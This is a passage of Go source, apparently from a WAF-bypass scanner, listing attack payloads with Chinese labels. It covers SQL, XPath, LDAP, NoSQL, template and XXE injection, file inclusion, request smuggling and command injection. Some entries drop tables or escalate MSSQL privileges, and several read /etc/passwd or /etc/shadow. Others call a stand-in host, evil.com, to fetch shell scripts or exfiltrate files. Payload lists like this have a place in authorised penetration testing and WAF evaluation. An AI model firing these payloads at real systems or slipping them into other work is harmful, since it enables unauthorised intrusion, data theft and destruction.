	{Raw: `1' AND OCT(97)='141'--`, Description: "字符-OCT", WAF: WAFGeneric},
	{Raw: `1' AND ASCII('a')=97--`, Description: "字符-ASCII", WAF: WAFGeneric},
	{Raw: `1' AND ORD('a')=97--`, Description: "字符-ORD", WAF: WAFGeneric},
}

var wafBypassCaseWhen = []Payload{
	{Raw: `1' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END)--`, Description: "CASE-基础WHEN", WAF: WAFGeneric},
	{Raw: `1' AND IF(1=1,1,0)--`, Description: "CASE-IF MySQL", WAF: WAFGeneric},
	{Raw: `1' AND IFNULL(1,0)--`, Description: "CASE-IFNULL", WAF: WAFGeneric},
	{Raw: `1' AND COALESCE(1,0)--`, Description: "CASE-COALESCE", WAF: WAFGeneric},
	{Raw: `1' AND NULLIF(1,2)=1--`, Description: "CASE-NULLIF", WAF: WAFGeneric},
	{Raw: `1' AND IIF(1=1,1,0)--`, Description: "CASE-IIF MSSQL", WAF: WAFGeneric},
	{Raw: `1' AND DECODE(1,1,1,0)--`, Description: "CASE-DECODE Oracle", WAF: WAFGeneric},
}

var wafBypassTimeBased = []Payload{
	{Raw: `1' AND SLEEP(5)--`, Description: "时间-SLEEP 5s", WAF: WAFGeneric},
	{Raw: `1' AND SLEEP(10)--`, Description: "时间-SLEEP 10s", WAF: WAFGeneric},
	{Raw: `1' AND SLEEP(15)--`, Description: "时间-SLEEP 15s", WAF: WAFGeneric},
	{Raw: `1' AND IF(1=1,SLEEP(5),0)--`, Description: "时间-IF SLEEP", WAF: WAFGeneric},
	{Raw: `1' AND BENCHMARK(5000000,MD5(1))--`, Description: "时间-BENCHMARK 5M", WAF: WAFGeneric},
	{Raw: `1' AND BENCHMARK(10000000,MD5(1))--`, Description: "时间-BENCHMARK 10M", WAF: WAFGeneric},
	{Raw: `1' AND BENCHMARK(50000000,MD5(1))--`, Description: "时间-BENCHMARK 50M", WAF: WAFGeneric},
	{Raw: `1' WAITFOR DELAY '00:00:05'--`, Description: "时间-WAITFOR DELAY", WAF: WAFGeneric},
	{Raw: `1' WAITFOR TIME '23:59:59'--`, Description: "时间-WAITFOR TIME", WAF: WAFGeneric},
	{Raw: `1';SELECT pg_sleep(5)--`, Description: "时间-pg_sleep", WAF: WAFGeneric},
	{Raw: `1' AND RLIKE SLEEP(5)--`, Description: "时间-RLIKE SLEEP", WAF: WAFGeneric},
}

var wafBypassStackedQueries = []Payload{
	{Raw: `1';SELECT 1--`, Description: "堆叠-基础分号", WAF: WAFGeneric},
	{Raw: `1';INSERT INTO x VALUES(1)--`, Description: "堆叠-INSERT", WAF: WAFGeneric},
	{Raw: `1';UPDATE x SET y=1--`, Description: "堆叠-UPDATE", WAF: WAFGeneric},
	{Raw: `1';DELETE FROM x--`, Description: "堆叠-DELETE", WAF: WAFGeneric},
	{Raw: `1';DROP TABLE x--`, Description: "堆叠-DROP", WAF: WAFGeneric},
	{Raw: `1';EXEC sp_addsrvrolemember 'domain\user','sysadmin'--`, Description: "堆叠-提权MSSQL", WAF: WAFGeneric},
	{Raw: `1';dbms_pipe.receive_message(('a'),5)--`, Description: "堆叠-Oracle延时", WAF: WAFGeneric},
	{Raw: `1';GO--`, Description: "堆叠-GO", WAF: WAFGeneric},
}

var wafBypassHTTPParamPollution = []Payload{
	{Raw: `id=1&id=%27+UNION+SELECT+1--`, Description: "HPP-URL编码注入", WAF: WAFGeneric},
	{Raw: `id=1&id=2&id='UNION+SELECT+1--`, Description: "HPP-三参数引号注入", WAF: WAFGeneric},
	{Raw: `id[]=1&id[]=%27+UNION+SELECT+NULL--`, Description: "HPP-数组Null注入", WAF: WAFGeneric},
	{Raw: `id%00=1&id=' UNION SELECT 1--`, Description: "HPP-Null参数名", WAF: WAFGeneric},
}

var wafBypassHTTPBodyVariants = []Payload{
	{Raw: `BODY:urlencoded id=' UNION SELECT 1--`, Description: "Body-表单编码注入", WAF: WAFGeneric},
	{Raw: `BODY:json {"id":"' UNION SELECT 1--"}`, Description: "Body-JSON注入", WAF: WAFGeneric},
	{Raw: `BODY:multipart Content-Disposition: form-data; name=\"id\"\r\n\r\n' UNION SELECT 1--`, Description: "Body-multipart注入", WAF: WAFGeneric},
	{Raw: `BODY:xml <?xml version=\"1.0\"?><id>' UNION SELECT 1--</id>`, Description: "Body-XML注入", WAF: WAFGeneric},
}

var wafBypassErrorBased = []Payload{
	{Raw: `1' AND extractvalue(1,concat(0x7e,database()))--`, Description: "Error-extractvalue", WAF: WAFGeneric},
	{Raw: `1' AND updatexml(1,concat(0x7e,database()),1)--`, Description: "Error-updatexml", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--`, Description: "Error-信息表计数", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT 1/0)--`, Description: "Error-除零错误", WAF: WAFGeneric},
	{Raw: `1' AND ST_LATFROMGEOHASH(NULL)--`, Description: "Error-ST函数NPE", WAF: WAFGeneric},
	{Raw: `1' AND GTID_SUBSET(CONCAT(0x7e,database()),1)--`, Description: "Error-GTID_SUBSET", WAF: WAFGeneric},
	{Raw: `1' AND EXP(~(SELECT*FROM(SELECT database())x))--`, Description: "Error-EXP溢出", WAF: WAFGeneric},
	{Raw: `1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--`, Description: "Error-updatexml版本", WAF: WAFGeneric},
	{Raw: "7' ORDER BY 1--+ AND 1=CONVERT(int,(SELECT @@version))--", Description: "Error-CONVERT类型错误", WAF: WAFGeneric},
	{Raw: `1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--`, Description: "Error-Oracle CTXSYS", WAF: WAFGeneric},
	{Raw: `1' AND ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64--`, Description: "Error-ORD盲注", WAF: WAFGeneric},
}

var wafBypassBlindSQL = []Payload{
	{Raw: `1' AND (SELECT SUBSTRING(database(),1,1))='a'--`, Description: "Blind-SUBSTRING数字", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>97--`, Description: "Blind-ASCII比较", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0))--`, Description: "Blind-IF时间盲注", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT CASE WHEN SUBSTRING(database(),1,1)='a' THEN SLEEP(2) ELSE 0 END)--`, Description: "Blind-CASE时间盲注", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT IFNULL((SELECT SLEEP(1)),0))--`, Description: "Blind-IFNULL SLEEP", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT LENGTH(database()))>0--`, Description: "Blind-数据库长度", WAF: WAFGeneric},
	{Raw: `1' AND ORD(MID((database()),1,1))>64--`, Description: "Blind-ORD盲注", WAF: WAFGeneric},
	{Raw: `1' AND BINARY_CHECKSUM(database())>0--`, Description: "Blind-BINARY_CHECKSUM", WAF: WAFGeneric},
	{Raw: `1' AND pg_sleep(5)--`, Description: "Blind-pg_sleep", WAF: WAFGeneric},
	{Raw: `1'+(SELECT*FROM(SELECT(SLEEP(5)))a)+'`, Description: "Blind-子查询SLEEP", WAF: WAFGeneric},
	{Raw: `1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--`, Description: "Blind-RLIKE条件", WAF: WAFGeneric},
}

var wafBypassXPath = []Payload{
	{Raw: `' or '1'='1`, Description: "XPath-永真OR", WAF: WAFGeneric},
	{Raw: `' and '1'='1`, Description: "XPath-永真AND", WAF: WAFGeneric},
	{Raw: `//user[@name='admin' or '1'='1']`, Description: "XPath-or查询", WAF: WAFGeneric},
	{Raw: `//user[@name='admin' and contains(@name,'admin')]`, Description: "XPath-contains", WAF: WAFGeneric},
	{Raw: `//user[@name='admin' and substring(@name,1,1)='a']`, Description: "XPath-substring", WAF: WAFGeneric},
	{Raw: `//user[@name='admin' and string-length(@name)>0]`, Description: "XPath-string-length", WAF: WAFGeneric},
	{Raw: `'] | //user[@name='admin'] | //*[@name='`, Description: "XPath-管道绕过", WAF: WAFGeneric},
	{Raw: `'] or '1'='1' and '1'='1`, Description: "XPath-or-and", WAF: WAFGeneric},
	{Raw: `'] | //*[contains(name,'admin')] | //*[contains('`, Description: "XPath-contains管道", WAF: WAFGeneric},
}

var wafBypassLDAP = []Payload{
	{Raw: `*)(uid=*))(|(uid=*`, Description: "LDAP-通配符注入", WAF: WAFGeneric},
	{Raw: `admin)(&(objectClass=*))`, Description: "LDAP-AND堆叠", WAF: WAFGeneric},
	{Raw: `admin)(|(objectClass=*))`, Description: "LDAP-OR堆叠", WAF: WAFGeneric},
	{Raw: `admin)(!(objectClass=*))`, Description: "LDAP-NOT堆叠", WAF: WAFGeneric},
	{Raw: `admin)(objectClass=*`, Description: "LDAP-括号扩展", WAF: WAFGeneric},
	{Raw: `*`, Description: "LDAP-纯通配符", WAF: WAFGeneric},
	{Raw: `admin*`, Description: "LDAP-用户通配符", WAF: WAFGeneric},
	{Raw: `admin)(|(password=*))`, Description: "LDAP-密码字段测试", WAF: WAFGeneric},
	{Raw: `*)(&(objectClass=user)(|(sAMAccountName=*)(userPrincipalName=*)))`, Description: "LDAP-完整查询", WAF: WAFGeneric},
}

var wafBypassCmdInjection = []Payload{
	{Raw: `;id`, Description: "CMD-分号id", WAF: WAFGeneric},
	{Raw: `|id`, Description: "CMD-管道id", WAF: WAFGeneric},
	{Raw: `||id`, Description: "CMD-双OR id", WAF: WAFGeneric},
	{Raw: `&&id`, Description: "CMD-双AND id", WAF: WAFGeneric},
	{Raw: `;cat /etc/passwd`, Description: "CMD-cat passwd", WAF: WAFGeneric},
	{Raw: `|cat /etc/passwd`, Description: "CMD-管道cat", WAF: WAFGeneric},
	{Raw: `$(id)`, Description: "CMD-子命令id", WAF: WAFGeneric},
	{Raw: "`id`", Description: "CMD-反引号id", WAF: WAFGeneric},
	{Raw: `;ls -la;`, Description: "CMD-分号ls", WAF: WAFGeneric},
	{Raw: `|ls -la|`, Description: "CMD-管道ls", WAF: WAFGeneric},
	{Raw: `;uname -a;`, Description: "CMD-uname", WAF: WAFGeneric},
	{Raw: `;wget http://evil.com/shell.sh;`, Description: "CMD-wget下载", WAF: WAFGeneric},
	{Raw: `|curl http://evil.com/`, Description: "CMD-curl外传", WAF: WAFGeneric},
	{Raw: `|\x20wget\x20http://evil.com/shell.sh`, Description: "CMD-十六进制空格", WAF: WAFGeneric},
	{Raw: `;cat /etc/shadow`, Description: "CMD-cat shadow", WAF: WAFGeneric},
	{Raw: `|/bin/cat /etc/passwd`, Description: "CMD-全路径cat", WAF: WAFGeneric},
	{Raw: `';cat /etc/passwd;'`, Description: "CMD-单引号包裹cat", WAF: WAFGeneric},
	{Raw: `";cat /etc/passwd;"`, Description: "CMD-双引号包裹cat", WAF: WAFGeneric},
	{Raw: `{\x60id\x60}`, Description: "CMD-花括号反引号", WAF: WAFGeneric},
	{Raw: `\x60id\x60`, Description: "CMD-十六进制反引号", WAF: WAFGeneric},
	{Raw: `%0aid`, Description: "CMD-换行符id", WAF: WAFGeneric},
	{Raw: `%0d%0aid`, Description: "CMD-CRLF id", WAF: WAFGeneric},
	{Raw: `\nid`, Description: "CMD-\\n换行", WAF: WAFGeneric},
	{Raw: `%7Cid`, Description: "CMD-URL编码管道", WAF: WAFGeneric},
	{Raw: `%26%26id`, Description: "CMD-URL编码AND", WAF: WAFGeneric},
	{Raw: `%7C%7Cid`, Description: "CMD-URL编码OR", WAF: WAFGeneric},
	{Raw: `%3Bid`, Description: "CMD-URL编码分号", WAF: WAFGeneric},
	{Raw: `'&' id`, Description: "CMD-单引号断路", WAF: WAFGeneric},
	{Raw: "\"\";id;\"\"", Description: "CMD-双引号分号", WAF: WAFGeneric},
	{Raw: `\x27\x3Bid`, Description: "CMD-全Hex编码", WAF: WAFGeneric},
}

var wafBypassUNIONCrossDB = []Payload{
	{Raw: `1' UNION SELECT 1 FROM dual--`, Description: "UNION-Oracle DUAL", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1 FROM master..sysdatabases--`, Description: "UNION-MSSQL master", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1 FROM pg_database--`, Description: "UNION-PostgreSQL pg_db", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1 FROM sqlite_master--`, Description: "UNION-SQLite master", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1 FROM SYSIBM.SYSDUMMY1--`, Description: "UNION-DB2 dummy", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT 1 FROM systables--`, Description: "UNION-Informix systables", WAF: WAFGeneric},
}

var wafBypassCOMMENTInjection = []Payload{
	{Raw: `SELECT/*foo*/1`, Description: "注释-内联注释SELECT", WAF: WAFGeneric},
	{Raw: `UN/**/ION`, Description: "注释-中断UNION", WAF: WAFGeneric},
	{Raw: `UNION/*!_*/ALL/*!_*/SELECT`, Description: "注释-_注释分隔", WAF: WAFGeneric},
	{Raw: `/*!UNION*//*!SELECT*/`, Description: "注释-版本号注释链", WAF: WAFGeneric},
	{Raw: `/**/UN/**/ION/**/SE/**/LECT/**/`, Description: "注释-每字符注释", WAF: WAFGeneric},
	{Raw: `UNI/**/ON/**/SEL/**/ECT`, Description: "注释-多段中断", WAF: WAFGeneric},
	{Raw: `UN/**/IO/**/N SE/**/LE/**/CT`, Description: "注释-三段中断", WAF: WAFGeneric},
	{Raw: `UNION/**/ALL/**/SELECT/**/1/**/FROM/**/DUAL`, Description: "注释-全链注释", WAF: WAFGeneric},
}

var wafBypassFUNCTIONHiding = []Payload{
	{Raw: `1' AND substring(@@version,1,1)=5--`, Description: "隐藏-SUBSTRING版本", WAF: WAFGeneric},
	{Raw: `1' AND mid(@@version,1,1)=5--`, Description: "隐藏-MID版本", WAF: WAFGeneric},
	{Raw: `1' AND substr(@@version,1,1)=5--`, Description: "隐藏-SUBSTR版本", WAF: WAFGeneric},
	{Raw: `1' AND left(@@version,1)=5--`, Description: "隐藏-LEFT版本", WAF: WAFGeneric},
	{Raw: `1' AND right(@@version,1)=5--`, Description: "隐藏-RIGHT版本", WAF: WAFGeneric},
	{Raw: `1' AND replace(@@version,'a','b')=@@version--`, Description: "隐藏-REPLACE测试", WAF: WAFGeneric},
	{Raw: `1' AND insert(@@version,1,0,'')=@@version--`, Description: "隐藏-INSERT测试", WAF: WAFGeneric},
	{Raw: `1' AND locate('5',@@version)>0--`, Description: "隐藏-LOCATE测试", WAF: WAFGeneric},
	{Raw: `1' AND position('5' in @@version)>0--`, Description: "隐藏-POSITION测试", WAF: WAFGeneric},
	{Raw: `1' AND instr(@@version,'5')>0--`, Description: "隐藏-INSTR测试", WAF: WAFGeneric},
	{Raw: `1' AND find_in_set('5',@@version)>0--`, Description: "隐藏-FIND_IN_SET测试", WAF: WAFGeneric},
	{Raw: `1' AND length(@@version)>0--`, Description: "隐藏-LENGTH版本", WAF: WAFGeneric},
	{Raw: `1' AND char_length(@@version)>0--`, Description: "隐藏-CHAR_LENGTH版本", WAF: WAFGeneric},
	{Raw: `1' AND character_length(@@version)>0--`, Description: "隐藏-CHARACTER_LENGTH", WAF: WAFGeneric},
	{Raw: `1' AND reverse(@@version)=@@version--`, Description: "隐藏-REVERSE测试", WAF: WAFGeneric},
	{Raw: `1' AND repeat(@@version,1)=@@version--`, Description: "隐藏-REPEAT测试", WAF: WAFGeneric},
	{Raw: `1' AND concat(left(@@version,1),right(@@version,1))=@@version--`, Description: "隐藏-CONCAT组合", WAF: WAFGeneric},
	{Raw: `1' AND lpad(@@version,20,'0')!=@@version--`, Description: "隐藏-LPAD测试", WAF: WAFGeneric},
	{Raw: `1' AND rpad(@@version,20,'0')!=@@version--`, Description: "隐藏-RPAD测试", WAF: WAFGeneric},
	{Raw: `1' AND make_set(1,@@version)=@@version--`, Description: "隐藏-MAKE_SET测试", WAF: WAFGeneric},
}

var wafBypassMATHOperations = []Payload{
	{Raw: `1' AND 2>1--`, Description: "数学-大于", WAF: WAFGeneric},
	{Raw: `1' AND 2!=1--`, Description: "数学-不等于", WAF: WAFGeneric},
	{Raw: `1' AND 'a'>'A'--`, Description: "数学-字符大小写", WAF: WAFGeneric},
	{Raw: `1' AND ASCII('a')>ASCIII('A')--`, Description: "数学-ASCII比较", WAF: WAFGeneric},
	{Raw: `1' AND 0x41=65--`, Description: "数学-Hex十进制", WAF: WAFGeneric},
	{Raw: `1' AND 0b1=1--`, Description: "数学-二进制", WAF: WAFGeneric},
	{Raw: `1' AND~0=-1--`, Description: "数学-按位非", WAF: WAFGeneric},
	{Raw: `1' AND 1>>0=1--`, Description: "数学-右移", WAF: WAFGeneric},
	{Raw: `1' AND 1<<0=1--`, Description: "数学-左移", WAF: WAFGeneric},
	{Raw: `1' AND 3&1=1--`, Description: "数学-按位与", WAF: WAFGeneric},
	{Raw: `1' AND 1|0=1--`, Description: "数学-按位或", WAF: WAFGeneric},
	{Raw: `1' AND floor(1.5)=1--`, Description: "数学-FLOOR", WAF: WAFGeneric},
	{Raw: `1' AND ceil(0.5)=1--`, Description: "数学-CEIL", WAF: WAFGeneric},
	{Raw: `1' AND round(1.4)=1--`, Description: "数学-ROUND", WAF: WAFGeneric},
	{Raw: `1' AND abs(-1)=1--`, Description: "数学-ABS", WAF: WAFGeneric},
	{Raw: `1' AND sqrt(1)=1--`, Description: "数学-SQRT", WAF: WAFGeneric},
	{Raw: `1' AND pow(1,1)=1--`, Description: "数学-POW", WAF: WAFGeneric},
	{Raw: `1' AND rand()>=0--`, Description: "数学-RAND", WAF: WAFGeneric},
	{Raw: `1' AND mod(1,1)=0--`, Description: "数学-MOD", WAF: WAFGeneric},
	{Raw: `1' AND greatest(1,2)=2--`, Description: "数学-GREATEST", WAF: WAFGeneric},
	{Raw: `1' AND least(1,2)=1--`, Description: "数学-LEAST", WAF: WAFGeneric},
	{Raw: `1' AND sign(1)=1--`, Description: "数学-SIGN", WAF: WAFGeneric},
	{Raw: `1' AND truncate(1.5,0)=1--`, Description: "数学-TRUNCATE", WAF: WAFGeneric},
}

var wafBypassDatabaseInfo = []Payload{
	{Raw: `1' AND (SELECT DATABASE()) LIKE '%'--`, Description: "信息-DATABASE()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT @@version)--`, Description: "信息-@@version", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT VERSION())--`, Description: "信息-VERSION()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT CURRENT_USER())--`, Description: "信息-CURRENT_USER()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT USER())--`, Description: "信息-USER()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT SYSTEM_USER())--`, Description: "信息-SYSTEM_USER()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT SESSION_USER())--`, Description: "信息-SESSION_USER()", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT @@hostname)--`, Description: "信息-@@hostname", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT @@datadir)--`, Description: "信息-@@datadir", WAF: WAFGeneric},
	{Raw: `1' AND (SELECT @@basedir)--`, Description: "信息-@@basedir", WAF: WAFGeneric},
}

var wafBypassInformationSchema = []Payload{
	{Raw: `1' UNION SELECT table_name FROM information_schema.tables--`, Description: "IS-tables", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT column_name FROM information_schema.columns--`, Description: "IS-columns", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT table_schema,table_name FROM information_schema.tables--`, Description: "IS-schema+tables", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT table_name,column_name FROM information_schema.columns--`, Description: "IS-tables+columns", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT schema_name FROM information_schema.schemata--`, Description: "IS-schemata", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--`, Description: "IS-GROUP_CONCAT所有表", WAF: WAFGeneric},
	{Raw: `1' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--`, Description: "IS-GROUP_CONCAT列", WAF: WAFGeneric},
}

var wafBypassSSTIInjection = []Payload{
	{Raw: `${{7*7}}`, Description: "SSTI-Jinja2模板表达式", WAF: WAFGeneric},
	{Raw: `{{7*7}}`, Description: "SSTI-Jinja2乘法测试", WAF: WAFGeneric},
	{Raw: `{{7*'7'}}`, Description: "SSTI-Jinja2字符串乘法", WAF: WAFGeneric},
	{Raw: `{{config}}`, Description: "SSTI-Jinja2配置对象", WAF: WAFGeneric},
	{Raw: `{{config.items()}}`, Description: "SSTI-Jinja2配置项", WAF: WAFGeneric},
	{Raw: `{{request}}`, Description: "SSTI-Flask request对象", WAF: WAFGeneric},
	{Raw: `{{self._TemplateReference__context}}`, Description: "SSTI-Jinja2模板上下文", WAF: WAFGeneric},
	{Raw: `{{lipsum.__globals__}}`, Description: "SSTI-Jinja2全局命名空间", WAF: WAFGeneric},
	{Raw: `{{''.__class__.__mro__}}`, Description: "SSTI-Jinja2 MRO遍历", WAF: WAFGeneric},
	{Raw: `{{''.__class__.__mro__[1].__subclasses__()}}`, Description: "SSTI-Jinja2子类枚举", WAF: WAFGeneric},
	{Raw: `{{''.__class__.__bases__[0].__subclasses__()}}`, Description: "SSTI-Jinja2基类遍历", WAF: WAFGeneric},
	{Raw: `{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__}}{% endif %}{% endfor %}`, Description: "SSTI-Jinja2内置函数提取", WAF: WAFGeneric},
	{Raw: `#{7*7}`, Description: "SSTI-FreeMarker表达式", WAF: WAFGeneric},
	{Raw: `${7*7}`, Description: "SSTI-Velocity/Freemarker表达式", WAF: WAFGeneric},
	{Raw: `<%= 7*7 %>`, Description: "SSTI-ERB模板", WAF: WAFGeneric},
	{Raw: `{{= 7*7}}`, Description: "SSTI-Dojo模板", WAF: WAFGeneric},
	{Raw: `{{handler.__class__.__init__.__globals__}}`, Description: "SSTI-Tornado handler", WAF: WAFGeneric},
	{Raw: `{{h.view.view.__class__.__mro__[2].__subclasses__()}}`, Description: "SSTI-Django view遍历", WAF: WAFGeneric},
	{Raw: `class.module.classLoader.resources.context.docBase`, Description: "SSTI-Spring EL", WAF: WAFGeneric},
	{Raw: `__${7*7}__::.x`, Description: "SSTI-Pebble模板", WAF: WAFGeneric},
}

var wafBypassXXEInjection = []Payload{
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Description: "XXE-文件读取基本", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`, Description: "XXE-PHP过滤器", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>&xxe;</foo>`, Description: "XXE-外部DTD加载", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`, Description: "XXE-expect协议", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/1234">]><foo>&xxe;</foo>`, Description: "XXE-gopher协议SSRF", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY % a SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSBiIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4=">%a;]><foo></foo>`, Description: "XXE-data协议DTD", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/file.txt">]><foo>&xxe;</foo>`, Description: "XXE-jar协议", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>`, Description: "XXE-netdoc协议", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY % b SYSTEM "file:///etc/passwd"><!ENTITY % c "<!ENTITY xxe SYSTEM 'http://evil.com/?%b;'>">%c;]><foo></foo>`, Description: "XXE-OOB带外盲注", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`, Description: "XXE-proc环境读取", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`, Description: "XXE-Windows文件读取", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY % payload SYSTEM "file:///dev/urandom" >%payload;]><foo></foo>`, Description: "XXE-urandom DoS", WAF: WAFGeneric},
	{Raw: `<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><text>&xxe;</text></svg>`, Description: "XXE-SVG文件读取", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://evil.com/o=xxe">]><foo>&xxe;</foo>`, Description: "XXE-LDAP协议", WAF: WAFGeneric},
	{Raw: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/%26xxe;">]><foo>&xxe;</foo>`, Description: "XXE-FTP协议", WAF: WAFGeneric},
}

var wafBypassFileInclusion = []Payload{
	{Raw: `../../../../etc/passwd`, Description: "LFI-基本路径遍历", WAF: WAFGeneric},
	{Raw: `....//....//....//....//etc/passwd`, Description: "LFI-双重编码遍历", WAF: WAFGeneric},
	{Raw: `..%252f..%252f..%252f..%252fetc/passwd`, Description: "LFI-双URL编码遍历", WAF: WAFGeneric},
	{Raw: `..%c0%af..%c0%af..%c0%afetc/passwd`, Description: "LFI-UTF-8超长编码", WAF: WAFGeneric},
	{Raw: `..\/..\/..\/..\/etc/passwd`, Description: "LFI-反斜杠遍历", WAF: WAFGeneric},
	{Raw: `....//....//....//....//etc/passwd%00`, Description: "LFI-Null字节截断", WAF: WAFGeneric},
	{Raw: `php://filter/convert.base64-encode/resource=index.php`, Description: "LFI-PHP filter base64", WAF: WAFGeneric},
	{Raw: `php://filter/read=string.rot13/resource=index.php`, Description: "LFI-PHP filter rot13", WAF: WAFGeneric},
	{Raw: `php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php`, Description: "LFI-PHP filter iconv", WAF: WAFGeneric},
	{Raw: `php://filter/zlib.deflate/resource=index.php`, Description: "LFI-PHP filter zlib", WAF: WAFGeneric},
	{Raw: `php://input`, Description: "LFI-PHP input流", WAF: WAFGeneric},
	{Raw: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`, Description: "LFI-data协议代码执行", WAF: WAFGeneric},
	{Raw: `expect://id`, Description: "LFI-expect协议命令", WAF: WAFGeneric},
	{Raw: `http://evil.com/shell.txt`, Description: "RFI-远程文件包含", WAF: WAFGeneric},
	{Raw: `http://evil.com/shell.txt?`, Description: "RFI-问号截断绕过", WAF: WAFGeneric},
}

var wafBypassNoSQLInjection = []Payload{
	{Raw: `{"username":{"$gt":""},"password":{"$gt":""}}`, Description: "NoSQL-$gt绕过MongoDB", WAF: WAFGeneric},
	{Raw: `{"username":{"$ne":""},"password":{"$ne":""}}`, Description: "NoSQL-$ne绕过MongoDB", WAF: WAFGeneric},
	{Raw: `{"$where":"this.password.length>0"}`, Description: "NoSQL-$where JS注入", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$regex":"^a"}}`, Description: "NoSQL-$regex盲注", WAF: WAFGeneric},
	{Raw: `{"$or":[{"username":"admin"},{"password":"test"}]}`, Description: "NoSQL-$or绕过", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$exists":true}}`, Description: "NoSQL-$exists检测", WAF: WAFGeneric},
	{Raw: `{"username":"admin","$where":"sleep(5000)"}`, Description: "NoSQL-时间盲注", WAF: WAFGeneric},
	{Raw: `{"username":{"$in":["admin","root","user"]},"password":"x"}`, Description: "NoSQL-$in枚举", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$type":2}}`, Description: "NoSQL-$type检测", WAF: WAFGeneric},
	{Raw: `{"username":"admin","$or":[{},{"password":"x"}],"$comment":"test"}`, Description: "NoSQL-$comment绕过", WAF: WAFGeneric},
	{Raw: `{"$where":"1==1"}`, Description: "NoSQL-$where永真", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$not":{"$gt":""}}}`, Description: "NoSQL-$not组合", WAF: WAFGeneric},
	{Raw: `{"username":{"$nin":["nonexistent"]},"password":"x"}`, Description: "NoSQL-$nin绕过", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$all":[]}}`, Description: "NoSQL-$all空数组", WAF: WAFGeneric},
	{Raw: `{"username":"admin","password":{"$size":0}}`, Description: "NoSQL-$size检测", WAF: WAFGeneric},
}

var wafBypassHTTPDesync = []Payload{
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n", Description: "HTTPD-CL.TE走私", WAF: WAFGeneric},
	{Raw: "GET / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\n0\r\n\r\n", Description: "HTTPD-TE.CL走私", WAF: WAFGeneric},
